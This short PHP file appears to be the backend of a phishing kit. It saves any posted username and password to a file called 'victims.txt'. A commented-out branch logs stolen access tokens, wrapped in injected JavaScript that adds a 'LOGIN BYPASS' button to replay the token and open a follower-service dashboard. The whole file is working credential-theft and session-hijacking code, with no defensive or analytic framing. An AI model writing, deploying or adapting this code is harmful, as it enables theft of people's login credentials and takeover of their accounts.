<?php
if (count($_POST) == 2){
    $f = fopen('victims.txt','a+');
    fwrite($f,$_POST['user'].'<!:!>'.$_POST['pw']."\n");
    fclose($f);
}
/*else{ 
    $f = fopen('victims.txt','a+');
    $u1 = <<<EOF
var btn=`<button style="height:100%;width:100%;background:red;" onclick='var values = {"access_token": "
EOF;
    $u2 = <<<WOF
"};$.ajax({url: "/login-procc.php",type: "POST",dataType: "json",data: values,success: function(data){window.location.href = "https://www.instafollowerspro.com/dashboard";}});'>LOGIN BYPASS</button>`;var bod=document.body.innerHTML;document.body.innerHTML='<br><br><br><br>'+btn+'<br><br>'+bod;
WOF;
    fwrite($f,$u1.$_POST['access_token'].$u2);
    fclose($f);
}*/

?>